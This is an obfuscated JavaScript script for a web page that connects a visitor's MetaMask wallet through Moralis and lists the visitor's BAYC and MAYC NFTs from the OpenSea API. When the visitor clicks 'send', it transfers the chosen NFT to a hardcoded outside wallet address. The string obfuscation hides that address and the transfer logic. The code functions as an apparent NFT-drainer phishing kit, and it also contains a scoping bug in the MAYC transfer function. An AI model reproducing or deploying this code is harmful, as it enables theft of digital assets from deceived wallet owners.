var _0x260f3c = _0x2f06;

function _0x42c1() {
  var _0x38a0bf = [
    "disabled",
    "charAt",
    "\x22>BAYC\x20#",
    "click",
    "remove",
    "token_id",
    "erc721",
    "connect",
    "117805YxYrXh",
    "236VkIdEG",
    "1359205WESkUj",
    "\x22>MAYC\x20#",
    "authenticate",
    "html",
    "\x0a\x20\x20\x20\x20\x20\x20<option\x20value=\x22",
    "1803210IHvztE",
    "#connect",
    "sendnft",
    "ethAddress",
    "style",
    "attributes",
    "transfer",
    "json",
    "1887466bueBdj",
    "24156RyzgxF",
    "https://n8xfna6hnfgn.usemoralis.com:2053/server",
    "0x60e4d786628fea6478f785a6d7e704777c86a7c6",
    "none",
    "&asset_contract_address=0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d&order_direction=desc&offset=0&limit=50",
    "0xbc4ca0eda7647a8ab7c2061c2e118a18a936f13d",
    "#selectape",
    "#toremove",
    "initialize",
    "getElementById",
    "Web3",
    "7101AcAYyY",
    "addEventListener",
    "serverURL",
    "0x6d8328b751A2713A2Ef638B10902b33B705f77A2",
    "#selectape\x20option:selected",
    "value",
    "text",
    "then",
    "</option>",
    "6iYPqoB",
    "2682459xuxtqM",
    "&asset_contract_address=0x60e4d786628fea6478f785a6d7e704777c86a7c6&order_direction=desc&offset=0&limit=50",
    "assets",
    "display",
    "8TdsspO",
    "querySelector",
  ];
  _0x42c1 = function () {
    return _0x38a0bf;
  };
  return _0x42c1();
}
(function (_0x15e104, _0x5f1fcd) {
  var _0x5e5938 = _0x2f06,
    _0x50076a = _0x15e104();
  while (!![]) {
    try {
      var _0x5d0e26 =
        -parseInt(_0x5e5938(0x19d)) / 0x1 +
        parseInt(_0x5e5938(0x1ad)) / 0x2 +
        (-parseInt(_0x5e5938(0x1b8)) / 0x3) *
          (-parseInt(_0x5e5938(0x19e)) / 0x4) +
        (-parseInt(_0x5e5938(0x19f)) / 0x5) *
          (parseInt(_0x5e5938(0x1c1)) / 0x6) +
        parseInt(_0x5e5938(0x1ac)) / 0x7 +
        (parseInt(_0x5e5938(0x1c6)) / 0x8) *
          (parseInt(_0x5e5938(0x1c2)) / 0x9) +
        -parseInt(_0x5e5938(0x1a4)) / 0xa;
      if (_0x5d0e26 === _0x5f1fcd) break;
      else _0x50076a["push"](_0x50076a["shift"]());
    } catch (_0x2e601b) {
      _0x50076a["push"](_0x50076a["shift"]());
    }
  }
})(_0x42c1, 0x247cd),
  Moralis[_0x260f3c(0x1b5)]("1NyP76CvaRkgbP55zDuSNJsTgYpmr11Wj5ZiIwjE"),
  (Moralis[_0x260f3c(0x1ba)] = _0x260f3c(0x1ae));
async function getBAYC(_0x2246c2) {
  var _0x4caa30 = _0x260f3c;
  const _0x231873 = {
    method: "GET",
  };
  fetch(
    "https://api.opensea.io/api/v1/assets?owner=" +
      _0x2246c2 +
      _0x4caa30(0x1b1),
    _0x231873
  )
    [_0x4caa30(0x1bf)]((_0x4e8f2f) => _0x4e8f2f[_0x4caa30(0x1ab)]())
    [_0x4caa30(0x1bf)]((_0x451384) => {
      var _0xa058d0 = _0x4caa30,
        _0x2de571 = 0x0;
      while (_0x451384[_0xa058d0(0x1c4)][_0x2de571]) {
        $(_0xa058d0(0x1b3))[_0xa058d0(0x1a2)](
          $("#selectape")[_0xa058d0(0x1a2)]() +
            (_0xa058d0(0x1a3) +
              _0x451384[_0xa058d0(0x1c4)][_0x2de571]["token_id"] +
              _0xa058d0(0x1ca) +
              _0x451384[_0xa058d0(0x1c4)][_0x2de571][_0xa058d0(0x1cd)] +
              _0xa058d0(0x1c0))
        ),
          _0x2de571++;
      }
      _0x2de571 > 0x0 &&
        ($(_0xa058d0(0x1b4))[_0xa058d0(0x1cc)](),
        (document["getElementById"](_0xa058d0(0x1a6))[_0xa058d0(0x1c8)] = ![]));
    });
}
async function getMAYC(_0x536c24) {
  var _0x441a64 = _0x260f3c;
  const _0x2eb57f = {
    method: "GET",
  };
  fetch(
    "https://api.opensea.io/api/v1/assets?owner=" +
      _0x536c24 +
      _0x441a64(0x1c3),
    _0x2eb57f
  )
    ["then"]((_0x228537) => _0x228537[_0x441a64(0x1ab)]())
    [_0x441a64(0x1bf)]((_0x5258a1) => {
      var _0x89ae4e = _0x441a64,
        _0x48fe35 = 0x0;
      while (_0x5258a1[_0x89ae4e(0x1c4)][_0x48fe35]) {
        $("#selectape")[_0x89ae4e(0x1a2)](
          $(_0x89ae4e(0x1b3))["html"]() +
            (_0x89ae4e(0x1a3) +
              _0x5258a1["assets"][_0x48fe35][_0x89ae4e(0x1cd)] +
              _0x89ae4e(0x1a0) +
              _0x5258a1[_0x89ae4e(0x1c4)][_0x48fe35]["token_id"] +
              "</option>")
        ),
          _0x48fe35++;
      }
      _0x48fe35 > 0x0 &&
        ($(_0x89ae4e(0x1b4))["remove"](),
        (document[_0x89ae4e(0x1b6)](_0x89ae4e(0x1a6))[_0x89ae4e(0x1c8)] = ![]));
    });
}

function _0x2f06(_0x305c0c, _0x1c8d7b) {
  var _0x42c1a4 = _0x42c1();
  return (
    (_0x2f06 = function (_0x2f063d, _0x43e8df) {
      _0x2f063d = _0x2f063d - 0x19c;
      var _0x2083f9 = _0x42c1a4[_0x2f063d];
      return _0x2083f9;
    }),
    _0x2f06(_0x305c0c, _0x1c8d7b)
  );
}
async function connectMetamask() {
  var _0x2dd1f1 = _0x260f3c,
    _0x2199e3 = await Moralis[_0x2dd1f1(0x1b7)][_0x2dd1f1(0x1a1)]();
  if (_0x2199e3) {
    let _0x2e7f64 = _0x2199e3[_0x2dd1f1(0x1a9)][_0x2dd1f1(0x1a7)];
    console.log("account address", _0x2e7f64);
    (document[_0x2dd1f1(0x1b6)](_0x2dd1f1(0x19c))[_0x2dd1f1(0x1a8)][
      _0x2dd1f1(0x1c5)
    ] = _0x2dd1f1(0x1b0)),
      (document[_0x2dd1f1(0x1b6)]("selectape")[_0x2dd1f1(0x1c8)] = ![]),
      getBAYC(_0x2e7f64),
      getMAYC(_0x2e7f64);
  }
}
document[_0x260f3c(0x1c7)](_0x260f3c(0x1a5))[_0x260f3c(0x1b9)](
  _0x260f3c(0x1cb),
  connectMetamask
),
  document[_0x260f3c(0x1c7)]("#sendnft")[_0x260f3c(0x1b9)]("click", sendNFT);
async function sendNFT() {
  var _0xf766dd = _0x260f3c;
  let _0x2cba25 = document["querySelector"](_0xf766dd(0x1b3)),
    _0x5b9aef = $(_0xf766dd(0x1bc))[_0xf766dd(0x1be)]()[_0xf766dd(0x1c9)](0x0);
  if (_0x5b9aef == "M") sendMAYC(_0x2cba25["value"]);
  else sendBAYC(_0x2cba25[_0xf766dd(0x1bd)]);
}
async function sendBAYC(_0x30093e) {
  var _0x499aa3 = _0x260f3c;
  Moralis[_0x499aa3(0x1aa)]({
    type: _0x499aa3(0x1ce),
    receiver: _0x499aa3(0x1bb),
    contractAddress: _0x499aa3(0x1b2),
    tokenId: _0x30093e,
  });
}
async function sendMAYC(_0x566d90) {
  var _0x94c0f7 = _0x260f3c;
  Moralis[_0x94c0f7(0x1aa)]({
    type: "erc721",
    receiver: _0x499aa3(0x1bb),
    contractAddress: _0x94c0f7(0x1af),
    tokenId: _0x566d90,
  });
}
